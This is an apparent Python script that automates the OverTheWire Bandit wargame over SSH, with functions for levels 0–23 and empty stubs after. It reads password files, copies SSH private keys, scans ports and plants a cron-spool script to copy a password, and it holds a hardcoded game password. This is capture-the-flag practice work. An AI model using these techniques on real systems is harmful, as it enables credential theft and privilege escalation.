#!/usr/bin/python3

import paramiko, os, time
import lib.recursive_file_decompressor as decompressor

otw_bandit_ssh_url = "bandit.labs.overthewire.org"
otw_bandit_ssh_port = 2220

user = "bandit0"
password = "bandit0"

def ssh_connection(username, password, use_ssh_key=False, sshkey_file=None):
    
    if (use_ssh_key == True and sshkey_file == None):
        raise Exception(f"An SSH Key file must be provided")
    
    client = paramiko.SSHClient()
    
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.load_system_host_keys()

    if (use_ssh_key):
        client.connect(hostname=otw_bandit_ssh_url, port=otw_bandit_ssh_port, username=username, password="", key_filename=sshkey_file)
    else:
        client.connect(hostname=otw_bandit_ssh_url, port=otw_bandit_ssh_port, username=username, password=password)

    return client

def createResourcesFolder():
    current_path = os.path.dirname(__file__)
    resources_path = os.path.join(current_path,'resources')
    
    if not os.path.exists(resources_path):
        os.makedirs(resources_path)
    
    return resources_path

def createSubfolderOnResourcesFolder(resources_path, subfolders):
    subfolder_path = os.path.join(resources_path,subfolders)
    
    if not os.path.exists(subfolder_path):
        os.makedirs(subfolder_path)
    
    return subfolder_path

# DONE
def bandit0_1(client):

    next_user = "bandit1"

    stdin, stdout, stderr = client.exec_command("cat readme | tail -n 2 | awk 'NF{print $NF}'")

    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit1_2(client):

    next_user = "bandit2"

    stdin, stdout, stderr = client.exec_command("cat ./-")

    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit2_3(client):

    next_user = "bandit3"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat spaces\\ in\\ this\\ filename")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit3_4(client):

    next_user = "bandit4"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cd inhere/ && ls -A")
    file_name = stdout.read().decode().strip()
    stdin, stdout, stderr = client.exec_command("cat inhere/"+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit4_5(client):

    next_user = "bandit5"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("file inhere/* | grep ASCII | awk -F \":\" '{print $1}' | xargs echo | xargs cat")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit5_6(client):

    next_user = "bandit6"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("find . -type f -size 1033c ! -executable -exec file {} + | grep ASCII | xargs echo | awk -F \":\" '{print $1}'")
    file_name = stdout.read().decode().strip()

    stdin, stdout, stderr = client.exec_command("cat "+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit6_7(client):

    next_user = "bandit7"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("find / -user bandit7 -group bandit6 2>/dev/null")
    file_name = stdout.read().decode().strip()

    stdin, stdout, stderr = client.exec_command("cat "+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit7_8(client):

    next_user = "bandit8"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("grep -r \"millionth\" data.txt | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit8_9(client):

    next_user = "bandit9"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat data.txt | sort | uniq -u")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit9_10(client):

    next_user = "bandit10"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("strings data.txt | grep \"====\" | tail -n 1 | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit10_11(client):

    next_user = "bandit11"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat data.txt | base64 -d | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit11_12(client):

    next_user = "bandit12"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit12_13(client):

    next_user = "bandit13"

    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit12_13')
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    client.exec_command('cat ~/data.txt | xxd -r > '+temp_dir+'/data')
    
    sftp = client.open_sftp()
    sftp.get(temp_dir+'/data',os.path.join(subfolder_path,'data.gz'))
    
    file_name = decompressor.decompress_until_plain_text(os.path.join(subfolder_path,'data.gz'), os.path.join(subfolder_path,'temp_output'))
    file = open(file_name, "r")

    next_password = file.read().split()[-1]

    client.close()

    return next_user, next_password

# DONE
def bandit13_14(client):

    next_user = "bandit14"
    
    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit13_14')

    sftp = client.open_sftp()
    sftp.get('/home/bandit13/sshkey.private',os.path.join(subfolder_path,'id_rsa'))

    # Process to obtain the ssh key file
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return next_user, next_password

# DONE
def bandit14_15(client):

    next_user = "bandit15"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit14")
    current_password = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("echo " + current_password + " | nc localhost 30000 | sed '/^$/d' | tail -n 1")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit15_16(client):

    next_user = "bandit16"
    
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit15")
    current_password = stdout.read().decode().strip()

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("echo " + current_password + " | ncat --ssl localhost 30001 | sed '/^$/d' | tail -n 1")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit16_17(client):

    next_user = "bandit17"
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    utils_path = os.path.join(os.path.dirname(__file__),'utils')
    
    sftp = client.open_sftp()
    sftp.put(os.path.join(utils_path,'portScan.sh'), temp_dir + '/portScan.sh')
        
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit16")
    current_password = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("chmod +x " + temp_dir + "/portScan.sh")
    stdin, stdout, stderr = client.exec_command(temp_dir + "/portScan.sh > " + temp_dir + "/ports.txt")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    stdin, stdout, stderr = client.exec_command("for port in $(cat " + temp_dir + "/ports.txt); do (echo " + current_password + " | ncat --ssl localhost $port 2>/dev/null | sed -n '/-----BEGIN RSA PRIVATE KEY-----/,/-----END RSA PRIVATE KEY-----/p'); done > " + temp_dir + "/id_rsa")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    # id_rsa file retieve
    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit16_17')
    sftp = client.open_sftp()
    sftp.get(temp_dir+'/id_rsa',os.path.join(subfolder_path,'id_rsa'))
    
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return next_user, next_password

# DONE
def bandit17_18(client):

    next_user = "bandit18"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("diff passwords.old passwords.new | tail -n 1 | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit18_19(client):

    next_user = "bandit19"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat readme")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit19_20(client):

    next_user = "bandit20"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("/home/bandit19/bandit20-do cat /etc/bandit_pass/bandit20")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit20_21(client):

    next_user = "bandit21"
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    utils_path = os.path.join(os.path.dirname(__file__),'utils')
    
    sftp = client.open_sftp()
    sftp.put(os.path.join(utils_path,'bandit21_password.sh'), temp_dir + '/script.sh')
        
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit20")
    current_password = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("chmod +x " + temp_dir + "/script.sh")
    
    stdin, stdout, stderr = client.exec_command(temp_dir + "/script.sh \"" + current_password + "\" \"" + temp_dir + "/log.txt\" \"" + temp_dir + "\"")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/log.txt")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit21_22(client):

    next_user = "bandit22"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat /usr/bin/cronjob_bandit22.sh | tail -n 1 | awk 'NF{print $NF}'")
    temp_folder = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("cat " + temp_folder)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit22_23(client):

    next_user = "bandit23"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("echo I am user " + next_user + " | md5sum | cut -d ' ' -f 1")
    temp_file = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("cat /tmp/" + temp_file)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit23_24(client):

    next_user = "bandit24"

    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    # temp_dir = "/tmp/tmp.5IUhLj88fz"
    print("Temp dir: " + temp_dir)
    
    stdin, stdout, stderr = client.exec_command("chmod o+wx " + temp_dir)
    
    stdin, stdout, stderr = client.exec_command("echo -e '#!/bin/bash\\n\\ncat /etc/bandit_pass/bandit24 > " + temp_dir + "/bandit24.password\\nchmod o+r " + temp_dir + "/bandit24.password' > " + temp_dir + "/script.sh")
    
    stdin, stdout, stderr = client.exec_command("chmod +x " + temp_dir + "/script.sh")
    
    stdin, stdout, stderr = client.exec_command("cp " + temp_dir + "/script.sh /var/spool/bandit24/foo/testing")
    
    stdin, stdout, stderr = client.exec_command("chmod +x /var/spool/bandit24/foo/testing")
    
    # sftp = client.open_sftp()
    # print(sftp.stat(temp_dir + "/bandit24.password"))
    
    passfile_exists = False
    
    while not passfile_exists:
        stdin, stdout, stderr = client.exec_command("ls " + temp_dir + " | grep -v 'script.sh'")
        time.sleep(1)
        print("Result: " + stdout.read().decode().strip())
        if "bandit24.password" in stdout.read().decode():
            stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/bandit24.password")
            passfile_exists = True
    
    # while True:
    #     stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/bandit24.password")
    #     stdout.channel.recv_exit_status() # Wait until the command finish
    #     print("Result: " + stdout.read().decode().strip())
    #     if not stdout.read().decode().strip():
    #         break
    
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit24_25(client):

    next_user = "bandit25"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit25_26(client):

    next_user = "bandit26"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit26_27(client):

    next_user = "bandit27"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit27_28(client):

    next_user = "bandit28"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit28_29(client):

    next_user = "bandit29"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit29_30(client):

    next_user = "bandit30"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit30_31(client):

    next_user = "bandit31"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit31_32(client):

    next_user = "bandit32"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def bandit32_33(client):

    next_user = "bandit33"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

def printCredentials():
    print(f"[+] Credentials for {user}: {password}")

if __name__ == '__main__':
    # DEBUG
    user = "bandit23"
    password = "0Zf11ioIjMVN551jX3CmStKLYqjk54Ga"
    # password = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit16_17\\id_rsa"

    # user, password = bandit22_23(ssh_connection(user, password))
    # printCredentials()
    
    user, password = bandit23_24(ssh_connection(user, password))
    printCredentials()
    
    # user, password = bandit24_25(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit25_26(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit26_27(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit27_28(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit28_29(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit29_30(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit30_31(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit31_32(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit32_33(ssh_connection(user, password))
    # printCredentials()


    ##############################################################################

    # user, password = bandit0_1(ssh_connection(user, password))
    # printCredentials()

    # user, password = bandit1_2(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit2_3(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit3_4(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit4_5(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit5_6(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit6_7(ssh_connection(user,password))
    # printCredentials()
    
    # user, password = bandit7_8(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit8_9(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit9_10(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit10_11(ssh_connection(user,password))
    # printCredentials()
    
    # user, password = bandit11_12(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit12_13(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit13_14(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit14_15(ssh_connection(user,password,use_ssh_key=True,sshkey_file=password))
    # printCredentials()

    # user, password = bandit15_16(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit16_17(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit17_18(ssh_connection(user,password,use_ssh_key=True,sshkey_file=password))
    # printCredentials()

    # user, password = bandit18_19(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit19_20(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit20_21(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit21_22(ssh_connection(user,password))
    # printCredentials()